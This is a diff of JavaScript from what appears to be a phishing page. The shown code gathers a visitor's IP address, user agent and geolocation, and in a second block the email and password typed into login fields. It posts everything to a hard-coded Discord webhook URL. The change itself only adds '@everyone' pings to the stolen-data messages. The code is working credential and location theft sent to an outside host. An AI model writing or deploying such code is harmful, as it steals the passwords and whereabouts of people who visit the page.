@@ -300,7 +300,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const useragent = navigator.userAgent;
     const lct = "\nLatitude: "+ posicao.coords.latitude+ "\nLongitude:"+ posicao.coords.longitude;
     const content = {
-        content: `=======\nIP: ${ip}\nUserAgent: ${useragent}\nCoords: ${lct}\n=======`
+        content: `=======\nIP: ${ip}\nUserAgent: ${useragent}\nCoords: ${lct}\n@everyone\n=======`
     }
     await fetch("https://discord.com/api/webhooks/1507506807726280836/gYcSNU1ui5DuzGIVe5xFD-hY2s1RshhCwf2Opt5CdKDbs7Y_Qm4Db5hya4t0d8GFnbLW",{
         method:"POST",
@@ -376,7 +376,7 @@ const useragent = navigator.userAgent;
         const ip = res2.origin;
         console.log(ip);
 const msg = {
-    content: `=======\nIP:${ip}\nUser-Agent:${useragent}\nEmail: ${inputs[0].value}\nSenha: ${inputs[1].value}\n=======`
+    content: `=======\nIP:${ip}\nUser-Agent:${useragent}\nEmail: ${inputs[0].value}\nSenha: ${inputs[1].value}\n@everyone\n=======`
 }
 await fetch("https://discord.com/api/webhooks/1507506807726280836/gYcSNU1ui5DuzGIVe5xFD-hY2s1RshhCwf2Opt5CdKDbs7Y_Qm4Db5hya4t0d8GFnbLW", {
     method:"POST",
